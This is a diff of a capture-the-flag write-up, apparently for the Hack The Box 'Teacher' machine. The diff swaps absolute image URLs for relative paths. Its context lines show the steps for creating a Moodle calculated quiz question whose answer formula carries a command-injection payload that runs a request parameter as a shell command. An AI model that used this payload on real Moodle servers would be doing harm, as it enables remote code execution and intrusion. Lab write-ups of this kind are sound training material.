@@ -89,14 +89,14 @@ Add an activity or resource --> Quiz --> Add
 
 Giving it a name, changing nothing else in the configuration and saving it by clicking on _"Save and display"_.
 
-![Creating a quiz](https://kyuu-ji.github.io/htb-write-up/teacher/teacher_web-1.png)
+![Creating a quiz](teacher_web-1.png)
 
 Creating question for the quiz:
 ```markdown
 Edit quiz --> Add --> a new question --> Calculated
 ```
 
-![Creating question](https://kyuu-ji.github.io/htb-write-up/teacher/teacher_web-2.png)
+![Creating question](teacher_web-2.png)
 
 ```markdown
 Question name: Test question name
@@ -106,7 +106,7 @@ Question text: Is this a question?
 Answer 1 formula = /\*{a\*/\`$_REQUEST[cmd]\`;//{x}}
 ```
 
-![Payload in answer formula](https://kyuu-ji.github.io/htb-write-up/teacher/teacher_web-3.png)
+![Payload in answer formula](teacher_web-3.png)
 
 ```markdown
 Save changes --> Do no synchronise --> Next page
